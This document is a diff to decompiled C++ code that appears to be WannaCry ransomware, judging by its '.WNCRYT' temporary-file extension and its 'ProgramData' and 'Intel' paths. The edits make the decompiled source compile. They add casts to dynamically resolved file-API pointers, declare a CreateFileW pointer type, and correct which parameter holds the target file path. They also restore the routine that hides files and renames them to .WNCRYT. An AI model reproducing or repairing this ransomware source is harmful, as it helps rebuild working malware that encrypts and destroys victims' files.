@@ -9,10 +9,11 @@
 #include <cwchar>
 #include <new>
 #include <iostream>
-#include <string>
 #include <exception>
-#include <string>
 //using namespace std;
+
+template<typename CharT = char, typename Traits = std::char_traits<CharT>, typename Allocator = std::allocator<CharT>>
+using basic_string = std::basic_string<CharT, Traits, Allocator>;
 
 #define pointer32 void*
 #define local_unwind2 _local_unwind2
@@ -1032,7 +1033,7 @@ unicode u_WINDOWS_1000ce94;
 unicode u_ProgramData_1000cea8;
 unicode u_Intel_1000cec4;
 undefined DAT_1000ced4;
-FARPROC DAT_1000d91c_far;
+//FARPROC DAT_1000d91c = nullptr;
 FARPROC DAT_1000d920_far;
 FARPROC DAT_1000d924_far;
 FARPROC DAT_1000d928_far;
@@ -2823,11 +2824,16 @@ void __thiscall FUN_10006940(void *pThis,uint *param_1,uint *param_2,uint param_
 }
 
 extern "C" {
-    uintptr_t DAT_1000d91c = 0;
     uintptr_t DAT_1000d924 = 0;
 }
 
 typedef void callback_fn_t(undefined4, LPCWSTR, LONG, DWORD, uint, DWORD);
+typedef HANDLE (WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+
+// Declaración
+//pCreateFileW DAT_1000d91c = nullptr;
+
+wchar_t u__WNCRYT_1000cbc8[] = L".WNCRYT";
 
 int __thiscall FUN_10001960(void *pThis,undefined4 param_1,LPCWSTR param_2,uint param_3)
 
@@ -2903,10 +2909,10 @@ int __thiscall FUN_10001960(void *pThis,undefined4 param_1,LPCWSTR param_2,uint 
     local_350 = 0xc0000000;
   }
   ExceptionList = &local_14;
-  pvVar1 = (HANDLE)(*DAT_1000d91c)(param_1,uVar8,3,0,3,0,0);
+  pvVar1 = (HANDLE)(*DAT_1000d91c)(param_2,uVar8,3,0,3,0,0);
   if (((pvVar1 == (HANDLE)0xffffffff) &&
       ((local_354 = pvVar1, iVar5 = FUN_10003000(), iVar5 == 0 ||
-       (pvVar1 = (HANDLE)(*DAT_1000d91c)(param_1,uVar8,3,0,3,0,0), local_354 = pvVar1,
+       (pvVar1 = (HANDLE)(*DAT_1000d91c)(param_2,uVar8,3,0,3,0,0), local_354 = pvVar1,
        pvVar1 == (HANDLE)0xffffffff)))) ||
      (local_354 = pvVar1, BVar2 = GetFileSizeEx(pvVar1,&local_320), BVar2 == 0)) goto LAB_1000208e;
   GetFileTime(pvVar1,&local_340,&local_338,&local_330);
@@ -3488,25 +3494,23 @@ lpFileName = reinterpret_cast<code *>(_C_exref);
         sVar4 = wcslen(_Str);
         if (sVar4 == 0) {
 LAB_10002ae4:
-          iVar6 = (*DAT_1000d930)(lpFileName);
+iVar6 = reinterpret_cast<int(__stdcall *)(void *)>(DAT_1000d930)(reinterpret_cast<void *>(lpFileName));
           if (iVar6 == 0) {
             DVar5 = GetFileAttributesW((LPCWSTR)lpFileName);
             SetFileAttributesW((LPCWSTR)lpFileName,DVar5 | 2);
-            (*DAT_1000d92c)(lpFileName,0,4);
+            reinterpret_cast<int(__stdcall *)(code *, int, int)>(DAT_1000d92c)(lpFileName, 0, 4);
           }
         }
         else {
-          iVar6 = (*DAT_1000d92c)(lpFileName,_Str,1);
+          iVar6 = reinterpret_cast<int(__stdcall *)(code *, wchar_t *, int)>(DAT_1000d92c)(lpFileName,_Str,1);
           if ((iVar6 == 0) && (DVar5 = GetFileAttributesW(_Str), DVar5 != 0xffffffff)) {
             DVar5 = GetFileAttributesW(_Str);
             SetFileAttributesW(_Str,DVar5 | 2);
-            (*DAT_1000d92c)(_Str,0,4);
-          }
+reinterpret_cast<int(__stdcall *)(wchar_t *, int, int)>(DAT_1000d92c)(_Str, 0, 4);          }
           iVar6 = *(int *)(param_1 + 0x914);
           *(int *)(param_1 + 0x914) = iVar6 + 1;
           swprintf(_Str,0x1000cbb8,(wchar_t *)(param_1 + 0x504),iVar6,u__WNCRYT_1000cbc8);
-          iVar6 = (*DAT_1000d92c)(lpFileName,_Str,1);
-          if (iVar6 == 0) goto LAB_10002ae4;
+iVar6 = reinterpret_cast<int(__stdcall *)(code *, wchar_t *, int)>(DAT_1000d92c)(lpFileName, _Str, 1);          if (iVar6 == 0) goto LAB_10002ae4;
         }
         piVar3 = (int *)**(undefined4 **)(param_1 + 0x4e4);
         *(int *)piVar3[1] = *piVar3;
